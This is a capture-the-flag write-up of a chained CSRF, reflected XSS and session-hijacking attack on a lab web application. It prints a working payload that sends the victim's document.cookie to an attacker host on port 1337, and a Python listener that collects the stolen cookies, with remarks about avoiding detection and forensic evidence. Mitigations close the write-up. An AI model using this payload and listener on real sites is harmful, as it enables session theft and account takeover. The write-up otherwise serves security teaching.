# CSRF → XSS → Cookie Theft Challenge Writeup

## Challenge Overview

This challenge demonstrates a multi-stage web attack combining three vulnerabilities:
1. **Cross-Site Request Forgery (CSRF)**: Force an authenticated user to execute unintended actions
2. **Cross-Site Scripting (XSS)**: Inject and execute malicious JavaScript in a target domain
3. **Session Hijacking**: Steal authentication cookies to impersonate the victim

The goal was to compromise an admin account by chaining these vulnerabilities to ultimately retrieve the system's flag.

## Solution Architecture

### Stage 1: CSRF Vector (index.html)
```html
<!DOCTYPE html>
<html>
<body>
<script>
const payload = "<img src=x onerror='new Image().src=\"http://hacker.localhost:1337/steal?\"+document.cookie'>";
window.location = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
</script>
</body>
</html>
```

**Technical Rationale:**
- Uses `window.location` to force a navigation CSRF
- Payload is URL-encoded to survive transmission
- `img` tag with invalid source ensures `onerror` execution
- `Image().src` provides a lightweight exfiltration method

### Stage 2: Cookie Receiver (server.py)
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/steal'):
            self.log_theft(self.path)
            self.send_response(200)
            self.end_headers()
            return
            
        self.serve_index()

if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 1337), Handler).serve_forever()
```

**Design Considerations:**
- Minimal server implementation to avoid detection
- Separate handlers for attack payload and data exfiltration
- Silent operation with only essential logging
- No persistent storage to avoid forensic evidence

## Attack Execution Flow

### Phase 1: Initial Compromise
1. **Victim Authentication**:
   - Admin logs into the vulnerable application
   - Session cookie is set in their browser

2. **CSRF Trigger**:
   - Admin visits attacker-controlled page
   - Malicious script executes automatically

### Phase 2: Payload Delivery
3. **XSS Injection**:
   - Browser is redirected to vulnerable endpoint
   - Payload is reflected into page DOM
   - Malicious JavaScript executes in application context

4. **Cookie Exfiltration**:
   - Same-origin policy allows cookie access
   - Stolen credentials are sent to attacker server
   - HTTP request appears as normal resource load

### Phase 3: Session Hijacking
5. **Attacker Retrieval**:
   - Server logs captured credentials
   - Attacker extracts session token from logs

6. **Privilege Escalation**:
   - Token is used to impersonate admin
   - Protected resources are accessed
   - Flag is retrieved from admin interface

## Technical Analysis

### Why This Combination Works
1. **CSRF Enables XSS Delivery**:
   - Bypasses authentication requirements
   - Leverages victim's existing session
   - Delivers payload to reflection point

2. **XSS Bypasses SOP**:
   - Executes in target origin context
   - Accesses protected cookies
   - Makes authenticated requests

3. **Minimalist Design Benefits**:
   - Fewer components reduce failure points
   - Lightweight payload avoids detection
   - Simple server is easily disposable

## Mitigation Strategies

### Defense-in-Depth Approach
1. **Against CSRF**:
   - Synchronizer token pattern
   - SameSite cookie attributes
   - Critical action confirmation

2. **Against XSS**:
   - Strict Content Security Policy
   - Context-aware output encoding
   - Trusted Types for DOM manipulation

3. **Against Session Hijacking**:
   - HttpOnly and Secure flags
   - Short session timeouts
   - IP binding for sensitive actions

## Key Lessons Learned

1. **Vulnerability Chaining**:
   - Individual weaknesses become critical when combined
   - Attack surfaces expand with interaction points

2. **Browser Security Nuances**:
   - Same-origin policy limitations
   - Cookie accessibility rules
   - Automatic credential inclusion

3. **Attack Design Principles**:
   - Minimalism increases reliability
   - Indirect techniques bypass defenses
   - Logging is crucial for blind attacks

This challenge demonstrates how modern web attacks often require chaining multiple vulnerabilities to achieve significant impact, emphasizing the need for comprehensive security measures.